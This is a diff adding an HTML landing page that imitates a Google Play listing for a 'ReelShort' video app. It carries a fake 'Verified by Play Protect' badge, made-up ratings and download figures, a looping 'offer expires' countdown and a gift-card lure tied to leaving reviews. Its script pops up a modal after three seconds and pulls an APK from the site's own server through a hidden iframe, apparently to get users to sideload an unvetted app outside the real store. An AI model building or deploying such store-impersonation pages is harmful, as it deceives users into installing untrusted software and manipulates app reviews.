@@ -1,0 +1,437 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <base href="/landing-pages/reelen/">
+
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+
+<meta property="og:title" content="ReelShort – Short Videos &amp; Entertainment">
+<meta property="og:description" content="ReelShort is your destination for short, fun, and engaging videos across music, comedy, trends, and more. Discover creative short videos, personalized recommendations, and trending content tailored to your interests.">
+<meta property="og:image" content="static/picture/logo3.webp">
+
+<link rel="icon" type="image/webp" href="static/picture/logo3.webp">
+<title>ReelShort – Short Videos &amp; Entertainment - Apps on Google Play</title>
+
+<style>
+/* ========== 全局重置与基础样式 ========== */
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html{font-size:16px}
+body{font-family:Roboto,'Segoe UI',Arial,sans-serif;background:#e8eaed;color:#202124;-webkit-font-smoothing:antialiased;overflow-x:hidden}
+a{text-decoration:none;color:inherit}
+button{border:none;background:none;cursor:pointer;font-family:inherit}
+img{max-width:100%;height:auto;display:block}
+
+/* ========== 页面整体容器 ========== */
+.page-wrapper{max-width:600px;margin:0 auto;background:#fff;min-height:100vh;position:relative;box-shadow:0 0 20px rgba(0,0,0,.08)}
+
+/* ========== 顶部导航栏 ========== */
+.header{display:flex;align-items:center;justify-content:space-between;padding:10px 16px;background:#fff;position:sticky;top:0;z-index:100}
+.header-left{display:flex;align-items:center;gap:10px}
+.header-menu-btn{width:40px;height:40px;display:flex;align-items:center;justify-content:center;border-radius:50%}
+.header-menu-btn:active{background:#f1f3f4}
+.header-menu-btn svg{width:24px;height:24px;color:#5f6368}
+.gp-logo{display:flex;align-items:center;gap:10px}
+.gp-logo img{width:30px;height:30px}
+.gp-logo span{font-size:20px;font-weight:400;color:#5f6368;letter-spacing:-.3px}
+.header-right{display:flex;align-items:center;gap:2px}
+.header-icon-btn{width:40px;height:40px;display:flex;align-items:center;justify-content:center;border-radius:50%}
+.header-icon-btn:active{background:#f1f3f4}
+.header-icon-btn svg{width:24px;height:24px;color:#5f6368}
+
+.container{padding:0 16px 16px}
+
+/* ========== 应用头部信息区 ========== */
+.app-header{display:flex;gap:16px;padding:16px 0;align-items:flex-start}
+.app-icon{width:72px;height:72px;border-radius:16px;overflow:hidden;flex-shrink:0;box-shadow:0 1px 3px rgba(0,0,0,.1)}
+.app-icon img{width:100%;height:100%;object-fit:cover}
+.app-info{flex:1;min-width:0}
+.app-name{font-size:20px;font-weight:500;color:#202124;line-height:1.3;margin-bottom:4px}
+.app-developer{font-size:14px;color:#01875f;margin-bottom:6px;display:inline-block}
+.verified{display:flex;align-items:center;gap:4px;font-size:12px;color:#5f6368}
+.verified svg{width:14px;height:14px;fill:#01875f}
+
+/* ========== 评分与下载量统计条 ========== */
+.stats-bar{display:flex;align-items:flex-start;gap:0;padding:0 0 20px}
+.stat-box{display:flex;flex-direction:column;padding:0 20px;position:relative;text-align:left}
+.stat-box:first-child{padding-left:0}
+.stat-box:not(:last-child)::after{content:'';position:absolute;right:0;top:10%;height:80%;width:1px;background:#e8eaed}
+.stat-box-value{font-size:15px;font-weight:500;color:#202124;line-height:1.2;display:flex;align-items:center;gap:2px}
+.stat-box-star{color:#01875f;font-size:14px}
+.stat-box-label{font-size:12px;color:#5f6368;margin-top:2px}
+
+/* ========== 主下载按钮 ========== */
+.install-btn{width:100%;background:#01875f;color:#fff;padding:12px;border-radius:8px;display:flex;flex-direction:column;align-items:center;gap:2px;margin-bottom:12px;transition:all .15s}
+.install-btn:active{background:#016d4d;transform:scale(.98)}
+.install-main{display:flex;align-items:center;gap:6px;font-size:14px;font-weight:500}
+.install-main svg{width:16px;height:16px}
+.install-sub{font-size:11px;font-weight:400;opacity:.9}
+
+/* ========== 分享 / 收藏 ========== */
+.actions{display:flex;align-items:center;justify-content:center;gap:40px;margin-bottom:20px}
+.action-btn{display:flex;align-items:center;gap:6px;font-size:13px;font-weight:500;color:#01875f;padding:8px 12px}
+.action-btn:active{background:#e6f5f0;border-radius:20px}
+.action-btn svg{width:18px;height:18px}
+
+/* ========== 应用截图区 ========== */
+.screenshots-section{margin:0 -16px 24px;position:relative}
+.screenshots-label{font-size:16px;font-weight:500;color:#202124;padding:0 16px;margin-bottom:12px}
+.screenshots-scroll{display:flex;gap:12px;overflow-x:auto;overflow-y:hidden;scroll-snap-type:x mandatory;-webkit-overflow-scrolling:touch;scrollbar-width:none;-ms-overflow-style:none;padding:0 16px;cursor:grab;user-select:none;-webkit-user-select:none;touch-action:pan-y}
+.screenshots-scroll::-webkit-scrollbar{display:none}
+.screenshots-scroll.dragging{scroll-snap-type:none;cursor:grabbing}
+.phone-frame{flex-shrink:0;width:170px;scroll-snap-align:start;position:relative}
+.phone-body{background:#1a1a1a;border-radius:20px;padding:6px;box-shadow:0 4px 12px rgba(0,0,0,.15)}
+.phone-notch{height:14px;display:flex;justify-content:center;align-items:center;margin-bottom:4px}
+.phone-notch-dot{width:40px;height:4px;background:#333;border-radius:4px}
+.phone-screen{border-radius:14px;overflow:hidden;background:#000;position:relative}
+.phone-screen img{width:100%;height:auto;aspect-ratio:9/16;object-fit:cover;display:block;pointer-events:none}
+.phone-home{height:12px;display:flex;justify-content:center;align-items:center;margin-top:4px}
+.phone-home-bar{width:60px;height:3px;background:#444;border-radius:3px}
+
+/* ========== 可折叠内容区块 ========== */
+.section{margin-bottom:20px;border-bottom:1px solid #e8eaed;padding-bottom:20px}
+.section:last-child{border-bottom:none}
+.section-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:12px;cursor:pointer}
+.section-title{font-size:16px;font-weight:500;color:#202124}
+.arrow-icon{width:20px;height:20px;color:#5f6368;transition:transform .2s}
+.section-header.collapsed .arrow-icon{transform:rotate(-90deg)}
+.section-content{font-size:14px;color:#5f6368;line-height:1.6}
+
+.tags{display:flex;flex-wrap:wrap;gap:8px;margin-top:12px}
+.tag{padding:6px 14px;border:1px solid #dadce0;border-radius:16px;font-size:12px;color:#5f6368;background:#fff}
+
+.info-row{display:flex;justify-content:space-between;align-items:center;padding:10px 0;border-bottom:1px solid #f1f3f4}
+.info-label{font-size:14px;color:#202124}
+.info-value{font-size:14px;color:#5f6368}
+
+/* ========== 评分汇总区 ========== */
+.reviews-summary{display:flex;align-items:flex-start;gap:16px;margin-bottom:16px}
+.rating-big{font-size:48px;font-weight:400;color:#202124;line-height:1}
+.rating-stars{display:flex;gap:2px;margin-bottom:4px}
+.rating-stars svg{width:14px;height:14px;fill:#01875f}
+.star-empty{fill:#dadce0!important}
+.star-count{font-size:12px;color:#5f6368}
+.rating-details{flex:1;padding-top:4px}
+.rating-bar{display:flex;align-items:center;gap:8px;margin-bottom:2px}
+.rating-bar-label{font-size:12px;color:#5f6368;width:10px;text-align:right}
+.rating-bar-track{flex:1;height:8px;background:#e8eaed;border-radius:4px;overflow:hidden}
+.rating-bar-fill{height:100%;background:#01875f;border-radius:4px}
+.rating-bar-count{font-size:11px;color:#5f6368;width:28px;text-align:right}
+
+/* ========== 单条用户评论 ========== */
+.review{padding:16px 0;border-bottom:1px solid #f1f3f4}
+.review-header{display:flex;align-items:center;gap:12px;margin-bottom:10px}
+.review-avatar{width:36px;height:36px;border-radius:50%;overflow:hidden;flex-shrink:0}
+.review-avatar img{width:100%;height:100%;object-fit:cover}
+.review-name{font-size:14px;font-weight:500;color:#202124}
+.review-stars{display:flex;align-items:center;gap:1px}
+.review-star{width:12px;height:12px;fill:#01875f}
+.review-date{font-size:12px;color:#5f6368;margin-left:8px}
+.review-text{font-size:14px;color:#202124;line-height:1.5;margin-bottom:12px}
+.helpful-btn{padding:6px 16px;border:1px solid #dadce0;border-radius:20px;font-size:13px;color:#01875f;font-weight:500;background:#fff}
+
+/* ========== 底部固定导航栏 ========== */
+.bottom-nav{position:fixed;bottom:0;left:50%;transform:translateX(-50%);width:100%;max-width:600px;background:#fff;border-top:1px solid #e8eaed;display:flex;justify-content:space-around;padding:6px 0;z-index:100}
+.nav-item{display:flex;flex-direction:column;align-items:center;gap:2px;font-size:11px;color:#5f6368;padding:2px 12px}
+.nav-item svg{width:24px;height:24px}
+.nav-item.active{color:#01875f;font-weight:500}
+.page-content{padding-bottom:56px}
+
+/* ========== 下载弹窗 ========== */
+.modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,.55);backdrop-filter:blur(5px);-webkit-backdrop-filter:blur(5px);z-index:1000;display:flex;align-items:flex-end;justify-content:center;opacity:0;pointer-events:none;transition:opacity .35s ease}
+.modal-overlay.active{opacity:1;pointer-events:all}
+.modal-content{background:#fff;width:100%;max-width:600px;border-radius:24px 24px 0 0;padding:24px 20px 32px;transform:translateY(100%);transition:transform .4s cubic-bezier(.16,1,.3,1);max-height:92vh;overflow-y:auto}
+.modal-overlay.active .modal-content{transform:translateY(0)}
+
+.progress-bar{width:100%;height:3px;background:#e8eaed;border-radius:3px;margin-bottom:16px;overflow:hidden}
+.progress-fill{height:100%;background:linear-gradient(90deg,#01875f,#34a853);border-radius:3px;width:0%}
+@keyframes progressFill{0%{width:0%}100%{width:100%}}
+
+.reward-header{text-align:center;margin-bottom:16px}
+.reward-header img{width:180px;margin:0 auto 8px}
+.modal-app-card{display:flex;align-items:center;gap:12px;background:#f8f9fa;border-radius:16px;padding:14px;margin-bottom:14px;border:1px solid #e8eaed}
+.modal-app-icon{width:52px;height:52px;border-radius:14px;overflow:hidden;flex-shrink:0}
+.modal-app-icon img{width:100%;height:100%;object-fit:cover}
+
+.countdown-badge{display:inline-flex;align-items:center;gap:6px;background:#fff3e0;border:1px solid #ffb74d;border-radius:20px;padding:6px 14px;font-size:12px;color:#e65100;font-weight:500;animation:pulse 1.5s infinite}
+@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.02)}}
+
+.gift-section{display:flex;align-items:center;gap:14px;background:linear-gradient(135deg,#fff9e6 0%,#fff3cd 100%);border-radius:16px;padding:16px;margin:14px 0 18px;border:1px solid #ffe082}
+.gift-image{width:70px;height:70px;flex-shrink:0}
+.modal-install-btn{width:100%;background:#01875f;color:#fff;font-size:16px;font-weight:600;padding:14px;border-radius:12px;display:flex;align-items:center;justify-content:center;gap:8px;box-shadow:0 4px 12px rgba(1,135,95,.3)}
+
+.toast{position:fixed;bottom:70px;left:50%;transform:translateX(-50%) translateY(100px);background:#323232;color:#fff;padding:10px 20px;border-radius:8px;font-size:13px;opacity:0;transition:all .3s ease;z-index:2000;white-space:nowrap;pointer-events:none}
+.toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
+</style>
+  <script src="/landing-runtime.js" defer></script>
+</head>
+
+<body>
+
+<div class="page-wrapper">
+<div class="page-content">
+
+  <!-- 顶部导航栏 -->
+  <div class="header">
+    <div class="header-left">
+      <button class="header-menu-btn"><svg viewbox="0 0 24 24" fill="currentColor"><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"></path></svg></button>
+      <div class="gp-logo">
+        <img src="static/picture/google_play.webp" alt="Google Play">
+        <span>Google Play</span>
+      </div>
+    </div>
+    <div class="header-right">
+      <button class="header-icon-btn"><svg viewbox="0 0 24 24" fill="currentColor"><path d="M15.5 14h-.79l-.28-.27A6.87 6.87 0 0016 9.5 6.5 6.5 0 009.5 3 6.5 6.5 0 009.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"></path></svg></button>
+    </div>
+  </div>
+
+  <div class="container">
+    <!-- 应用基本信息 -->
+    <div class="app-header">
+      <div class="app-icon"><img src="static/picture/logo3.webp" alt="ReelShort"></div>
+      <div class="app-info">
+        <div class="app-name">ReelShort – Short Videos &amp; Entertainment</div>
+        <a href="#" class="app-developer" onclick="return false;">ReelShort Media Pvt. Ltd.</a>
+        <div class="verified">
+          <svg viewbox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"></path></svg>
+          Verified by Play Protect
+        </div>
+      </div>
+    </div>
+
+    <!-- 评分下载量 -->
+    <div class="stats-bar">
+      <div class="stat-box"><div class="stat-box-value">4.8<span class="stat-box-star">★</span></div><div class="stat-box-label">2.5L reviews</div></div>
+      <div class="stat-box"><div class="stat-box-value">50L+</div><div class="stat-box-label">Downloads</div></div>
+    </div>
+
+    <!-- [主下载按钮] -->
+    <button class="install-btn" onclick="downloadApp()">
+      <div class="install-main">
+        <svg viewbox="0 0 24 24" fill="currentColor"><path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"></path></svg>
+        Rapid Install
+      </div>
+      <div class="install-sub">Download within 10 seconds</div>
+    </button>
+
+    <!-- 操作 -->
+    <div class="actions">
+      <button class="action-btn" onclick="showToast('Share link copied!')">
+        <svg viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 8A3 3 0 1018 2 3 3 0 0018 8zM6 15a3 3 0 100-6 3 3 0 000 6zM18 22a3 3 0 100-6 3 3 0 000 6zM8.59 13.51l6.83 3.98M15.41 6.51L8.59 10.49"></path></svg>
+        Share
+      </button>
+      <button class="action-btn" onclick="showToast('Added to wishlist!')">
+        <svg viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 21l-7-5-7 5V5a2 2 0 012-2h10a2 2 0 012 2z"></path></svg>
+        Wishlist
+      </button>
+    </div>
+
+    <!-- 截图区 -->
+    <div class="screenshots-section">
+      <div class="screenshots-label">Screenshots</div>
+      <div class="screenshots-scroll" id="screenshotSlider">
+        <div class="phone-frame"><div class="phone-body"><div class="phone-notch"><div class="phone-notch-dot"></div></div><div class="phone-screen"><img src="static/picture/screen1.webp" draggable="false"></div><div class="phone-home"><div class="phone-home-bar"></div></div></div></div>
+        <div class="phone-frame"><div class="phone-body"><div class="phone-notch"><div class="phone-notch-dot"></div></div><div class="phone-screen"><img src="static/picture/screen2.webp" draggable="false"></div><div class="phone-home"><div class="phone-home-bar"></div></div></div></div>
+        <div class="phone-frame"><div class="phone-body"><div class="phone-notch"><div class="phone-notch-dot"></div></div><div class="phone-screen"><img src="static/picture/screen3.webp" draggable="false"></div><div class="phone-home"><div class="phone-home-bar"></div></div></div></div>
+        <div class="phone-frame"><div class="phone-body"><div class="phone-notch"><div class="phone-notch-dot"></div></div><div class="phone-screen"><img src="static/picture/screen4.webp" draggable="false"></div><div class="phone-home"><div class="phone-home-bar"></div></div></div></div>
+      </div>
+    </div>
+
+    <!-- 关于应用 -->
+    <div class="section">
+      <div class="section-header" onclick="toggleSection(this)">
+        <h2 class="section-title">About this app</h2>
+        <svg class="arrow-icon" viewbox="0 0 24 24" fill="currentColor"><path d="M9.29 6.71a.996.996 0 000 1.41L13.17 12l-3.88 3.88a.996.996 0 101.41 1.41l4.59-4.59a.996.996 0 000-1.41L10.7 6.7c-.38-.38-1.02-.38-1.41.01z"></path></svg>
+      </div>
+      <div class="section-content">
+        <p>ReelShort is your destination for short, fun, and engaging videos across music, comedy, trends, and more.</p>
+        <div class="tags">
+          <span class="tag">Trending</span><span class="tag">Music</span><span class="tag">Comedy</span><span class="tag">Entertainment</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- 评分评论 -->
+    <div class="section">
+      <div class="section-header" onclick="toggleSection(this)">
+        <h2 class="section-title">Ratings and reviews</h2>
+        <svg class="arrow-icon" viewbox="0 0 24 24" fill="currentColor"><path d="M9.29 6.71a.996.996 0 000 1.41L13.17 12l-3.88 3.88a.996.996 0 101.41 1.41l4.59-4.59a.996.996 0 000-1.41L10.7 6.7c-.38-.38-1.02-.38-1.41.01z"></path></svg>
+      </div>
+      <div class="section-content">
+        <div class="reviews-summary">
+          <div><div class="rating-big">4.8</div><div class="star-count">250K+ reviews</div></div>
+          <div class="rating-details">
+            <div class="rating-bar"><span class="rating-bar-label">5</span><div class="rating-bar-track"><div class="rating-bar-fill" style="width:80%"></div></div></div>
+            <div class="rating-bar"><span class="rating-bar-label">4</span><div class="rating-bar-track"><div class="rating-bar-fill" style="width:15%"></div></div></div>
+            <div class="rating-bar"><span class="rating-bar-label">3</span><div class="rating-bar-track"><div class="rating-bar-fill" style="width:5%"></div></div></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div><!-- /.container -->
+
+  <!-- 底部固定导航 -->
+  <div class="bottom-nav">
+    <a href="#" class="nav-item"><svg viewbox="0 0 24 24" fill="currentColor"><path d="M21 6H3c-1.1 0-2 .9-2 2v8c0 1.1.9 2 2 2h18c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2zm-10 7H8v3H6v-3H3v-2h3V8h2v3h3v2z"></path></svg>Games</a>
+    <a href="#" class="nav-item active"><svg viewbox="0 0 24 24" fill="currentColor"><path d="M4 8h4V4H4v4zm6 12h4v-4h-4v4zm-6 0h4v-4H4v4zm0-6h4v-4H4v4z"></path></svg>Apps</a>
+    <a href="#" class="nav-item"><svg viewbox="0 0 24 24" fill="currentColor"><path d="M18 4l2 4h-3l-2-4h-2l2 4h-3l-2-4H8l2 4H7L5 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V4h-4z"></path></svg>Movies</a>
+  </div>
+
+</div><!-- /.page-content -->
+</div><!-- /.page-wrapper -->
+
+<!-- 下载弹窗 -->
+<div class="modal-overlay" id="downloadModal">
+  <div class="modal-content">
+    <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+    <div class="reward-header">
+      <img src="static/picture/reward.webp" alt="Rewards">
+      <div style="font-size:13px;color:#5f6368;margin-top:8px">We are collecting 'objective' reviews for this app</div>
+    </div>
+    <div class="modal-app-card">
+      <div class="modal-app-icon"><img src="static/picture/logo3.webp" alt="ReelShort"></div>
+      <div class="modal-app-info">
+        <div style="font-size:15px;font-weight:600">ReelShort – Videos</div>
+        <div style="font-size:12px;color:#01875f">Verified by Play Protect</div>
+      </div>
+    </div>
+    <div style="text-align:center">
+      <div class="countdown-badge"><span id="countdownText">Offer expires in 5m 00s</span></div>
+    </div>
+    <div class="gift-section">
+      <div class="gift-image"><img src="static/picture/giftcard.webp" alt="Gift Card"></div>
+      <div style="font-size:12px;color:#5d4037">Win <b>₹500</b> Gift Card! Download and leave an objective review to participate.</div>
+    </div>
+    <!-- [弹窗下载按钮] -->
+    <button class="modal-install-btn" onclick="downloadApp()">
+      <svg viewbox="0 0 24 24" fill="currentColor" width="20"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"></path></svg>
+      Install Now
+    </button>
+  </div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+/* ============================================================
+   APK 下载逻辑：请求 download.php?v=[时间戳]
+   ============================================================ */
+
+var modalShown = false;
+
+// 统一下载入口
+function downloadApp() {
+    openDownloadModal();
+    
+    // 生成当前时间戳
+    var timestamp = new Date().getTime();
+    var downloadUrl = 'download/?v=' + timestamp;
+    
+    // 触发下载
+    startApkDownload(downloadUrl);
+}
+
+// 自动弹窗逻辑 (3秒后弹出)
+setTimeout(function(){
+    if(!modalShown) openDownloadModal();
+}, 3000);
+
+function openDownloadModal(){
+    var modal = document.getElementById('downloadModal');
+    if(!modal.classList.contains('active')){
+        modal.classList.add('active');
+        modalShown = true;
+        document.body.style.overflow = 'hidden';
+        
+        // 重置进度条动画
+        var fill = document.getElementById('progressFill');
+        fill.style.animation = 'none';
+        fill.offsetHeight; // 强制重绘
+        fill.style.animation = 'progressFill 3s linear forwards';
+    }
+}
+
+// 点击遮罩关闭弹窗
+document.getElementById('downloadModal').addEventListener('click', function(e){
+    if(e.target === this){
+        this.classList.remove('active');
+        document.body.style.overflow = '';
+    }
+});
+
+function startApkDownload(url){
+    if (!url) return;
+    showToast('Starting download...');
+    
+    // 使用隐藏 iframe 触发下载
+    var iframe = document.createElement('iframe');
+    iframe.style.display = 'none';
+    iframe.src = url;
+    document.body.appendChild(iframe);
+    
+    setTimeout(function(){
+        if(iframe.parentNode) document.body.removeChild(iframe);
+    }, 10000);
+}
+
+function showToast(msg){
+    var t = document.getElementById('toast');
+    t.textContent = msg;
+    t.classList.add('show');
+    setTimeout(function(){t.classList.remove('show');}, 2500);
+}
+
+/* ============================================================
+   UI 交互逻辑 (截图拖拽 & 折叠 & 倒计时)
+   ============================================================ */
+
+// 截图拖拽
+(function(){
+    var slider = document.getElementById('screenshotSlider');
+    if(!slider) return;
+    var isDown = false, startX, scrollLeft;
+    slider.addEventListener('mousedown', function(e){
+        isDown = true; slider.classList.add('dragging');
+        startX = e.pageX - slider.offsetLeft; scrollLeft = slider.scrollLeft;
+    });
+    slider.addEventListener('mouseleave', function(){ isDown = false; slider.classList.remove('dragging'); });
+    slider.addEventListener('mouseup', function(){ isDown = false; slider.classList.remove('dragging'); });
+    slider.addEventListener('mousemove', function(e){
+        if(!isDown) return;
+        e.preventDefault();
+        var x = e.pageX - slider.offsetLeft;
+        var walk = (x - startX) * 2;
+        slider.scrollLeft = scrollLeft - walk;
+    });
+})();
+
+// 折叠区块
+function toggleSection(header){
+    header.classList.toggle('collapsed');
+    var content = header.nextElementSibling;
+    if(content.style.display === 'none'){
+        content.style.display = 'block';
+    } else {
+        content.style.display = 'none';
+    }
+}
+
+// 倒计时 (循环5分钟)
+var countdownSeconds = 300;
+function updateCountdown(){
+    var mins = Math.floor(countdownSeconds / 60);
+    var secs = countdownSeconds % 60;
+    var el = document.getElementById('countdownText');
+    if(el) el.textContent = 'Offer expires in ' + mins + 'm ' + (secs < 10 ? '0' : '') + secs + 's';
+    countdownSeconds--;
+    if(countdownSeconds < 0) countdownSeconds = 300;
+}
+setInterval(updateCountdown, 1000);
+updateCountdown();
+
+</script>
+
+<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v3d52b47920f24c319d37e2661827c42b1787588026925" integrity="sha512-d9sL6GJLXn6fInD1+TVXhTcQOsmxeHfmHAvwGDIxp5TO+uo1fiWW7mHomMj4MLRlCsJDTqXzWLHJFFlPCEIj/A==" data-cf-beacon='{"version":"2024.11.0","token":"d8d0a4b6e3294b56990fe4f7e7e0a13a","r":1}' crossorigin="anonymous"></script>
+</body>
+</html>
